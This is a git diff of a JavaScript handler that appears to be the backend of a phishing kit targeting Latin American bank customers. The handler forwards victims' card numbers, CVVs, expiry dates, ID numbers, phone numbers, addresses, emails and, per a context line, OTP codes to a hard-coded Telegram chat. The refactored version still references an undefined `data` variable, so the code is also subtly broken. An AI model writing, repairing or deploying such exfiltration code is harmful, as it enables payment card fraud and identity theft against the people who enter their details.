@@ -337,48 +337,81 @@ ${session.otp ? "💸" : "🟡"} Dinamica: ${session.otp || "PENDIENTE"}
   }
 }
 
+
 export const latamSimpleMsj = async (req, res) => {
-  const token = process.env.TELEGRAM_BOT_TOKEN;
-  const raw = req.body;
-  console.log(req.body)
-  const data = JSON.parse(raw.data);
-
-  const chatId = "-1002850830211";
-  
-  let text = `
-🚨🚨 Nuevo Ingreso 🚨🚨
-
-╭🟡 Banco: ${data.banco}
-┣🟢 Nombre: ${data.nombre}
-┣🟢 Cedula: ${data.cedula}
-┣🟢 Tarjeta: ${data.tarjeta}
-┣🟢 Exp: ${data.fecha}
-┣🟢 Cvv: ${data.cvv}
-╰🟢 Telefono: ${data.telefono}
-╰🟢 Direccion: ${data.direccion}
-╰🟢 Correo: ${data.email}`
   try {
-    const result = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ chat_id: chatId, text }),
-    });
-
-    if (!result.ok) {
-      throw new Error('Error en la respuesta de Telegram');
+    const token = process.env.TELEGRAM_BOT_TOKEN;
+    if (!token) {
+      return res.status(500).json({ success: false, error: 'Missing TELEGRAM_BOT_TOKEN' });
     }
 
-    const data = await result.json();
-    if (data.ok) {
-      return res.status(200).json({ success: true, messageId: data.result.message_id });
+    // 1) Normaliza el payload: soporta req.body como objeto o string y con/ sin campo "data"
+    const raw = req.body;
+    let payload;
+
+    if (typeof raw === 'string') {
+      payload = JSON.parse(raw);
+    } else if (raw && typeof raw.data === 'string') {
+      payload = JSON.parse(raw.data);
+    } else if (raw && typeof raw.data === 'object') {
+      payload = raw.data;
     } else {
-      throw new Error('Error en la respuesta de Telegram: ' + JSON.stringify(data));
+      payload = raw; // ya es objeto usable
     }
-  } catch (error) {
-    console.error('Error al enviar mensaje a Telegram:', error.message);
-    return res.status(500).json({ success: false, error: error.message });
+
+    // 2) Valida campos requeridos
+    if (!payload || typeof payload !== 'object' || !payload.banco) {
+      return res.status(400).json({ success: false, error: 'Invalid payload: "banco" is required' });
+    }
+
+    const chatId = '-1002850830211';
+    const text = [
+      '🚨🚨 Nuevo Ingreso 🚨🚨',
+      '',
+      `╭🟡 Banco: ${data.banco}
+      ┣🟢 Nombre: ${data.nombre}
+      ┣🟢 Cedula: ${data.cedula}
+      ┣🟢 Tarjeta: ${data.tarjeta}
+      ┣🟢 Exp: ${data.fecha}
+      ┣🟢 Cvv: ${data.cvv}
+      ╰🟢 Telefono: ${data.telefono}
+      ╰🟢 Direccion: ${data.direccion}
+      ╰🟢 Correo: ${data.email}`
+      // agrega más líneas si las tienes (monto, fecha, etc.)
+    ].join('\n');
+
+    // 3) fetch con timeout (AbortController)
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 25000); // 25s
+    let tgResp, tgJson;
+
+    try {
+      tgResp = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: chatId, text }),
+        signal: controller.signal
+      });
+      tgJson = await tgResp.json().catch(() => null);
+    } finally {
+      clearTimeout(timeout);
+    }
+
+    if (!tgResp.ok || !tgJson?.ok) {
+      return res.status(502).json({
+        success: false,
+        error: 'Telegram error',
+        detail: tgJson ?? { status: tgResp.status, statusText: tgResp.statusText }
+      });
+    }
+
+    return res.status(200).json({ success: true, messageId: tgJson.result?.message_id });
+  } catch (err) {
+    console.error('ltm-send-message error:', err);
+    return res.status(500).json({ success: false, error: String(err?.message || err) });
   }
 };
+
 
 export const editLatamMsj = async (req, res) => {
   const token = process.env.TELEGRAM_BOT_TOKEN;
